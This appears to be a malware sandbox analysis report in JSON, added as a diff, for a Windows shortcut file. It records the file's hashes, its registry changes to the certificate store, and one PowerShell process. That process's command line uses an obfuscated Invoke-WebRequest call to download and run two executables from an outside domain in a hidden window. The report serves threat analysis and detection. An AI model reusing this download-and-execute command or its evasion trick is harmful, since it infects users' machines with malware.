@@ -1,0 +1,79 @@
+{
+  "schema_version": "1.0.17",
+  "sha256": "2e7aa640b2da6d9350afba1b8ad0b65bc85ac335dde42f08cd540da8580e2a78",
+  "overall_status": "SUCCESS",
+  "unified_at": "2026-11-08T14:35:16.169Z",
+  "metadata": {
+    "hashes": {
+      "sha256": "2e7aa640b2da6d9350afba1b8ad0b65bc85ac335dde42f08cd540da8580e2a78",
+      "sha1": "cf7debc68f2fb503b92089b3dd1c065b93352854",
+      "md5": "0c1eb2f8168941dc911360995e8b200c"
+    },
+    "file_info": {
+      "file_name": "bounty-27619769908387977",
+      "file_type": [
+        "lnk"
+      ],
+      "file_type_id": "file link",
+      "file_size": 22528,
+      "entropy": 0.56,
+      "is_container_sample": false,
+      "url_analysis": false
+    },
+    "submissions": {
+      "first_seen": 1712304028000,
+      "last_seen": 1792484231000,
+      "last_multi_scan": 1792484231000
+    }
+  },
+  "activity": {
+    "process_activity": {
+      "sources": [
+        {
+          "report_type": "sandbox",
+          "report_id": "6a8586cc38cd183d6302b63b"
+        }
+      ],
+      "processes": [
+        {
+          "pid": 980,
+          "ppid": 0,
+          "name": "powershell.exe",
+          "command_line": "-WindowStyle hidden echo 21; &(Get-Command in***********e-webr*) -uri http://i-like-hokku.co.ua/securitycheck.exe -OutFile securitycheck.exe; start securitycheck.exe ; &(Get-Command in**********************e-webre*) -uri http://i-like-hokku.co.ua/sud/dvs.exe -OutFile dvs.exe; start dvs.exe",
+          "sha256": "34507738f84b9d4f231dc0c187fee4a03b4ddb84cf63ff56a4a1761a9bd56ea6",
+          "normalized_path": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "uid": "00000000-00000980",
+          "icon": "$50"
+        }
+      ]
+    },
+    "registry_activity": {
+      "keys_created": [
+        {
+          "key": "HKCUHKCU\\SOFTWARE\\MICROSOFT\\SYSTEMCERTIFICATES\\CA\\",
+          "sources": [
+            {
+              "report_type": "sandbox",
+              "report_id": "6a8586cc38cd183d6302b63b"
+            }
+          ]
+        },
+        {
+          "key": "HKCUHKCU\\SOFTWARE\\MICROSOFT\\SYSTEMCERTIFICATES\\CA\\CERTIFICATES\\",
+          "sources": [
+            {
+              "report_type": "sandbox",
+              "report_id": "6a8586cc38cd183d6302b63b"
+            }
+          ]
+        }
+      ],
+      "keys_modified": null,
+      "keys_deleted": null
+    },
+    "network_activity": {
+      "http_requests": null,
+      "contacted_hosts": null
+    }
+  }
+}
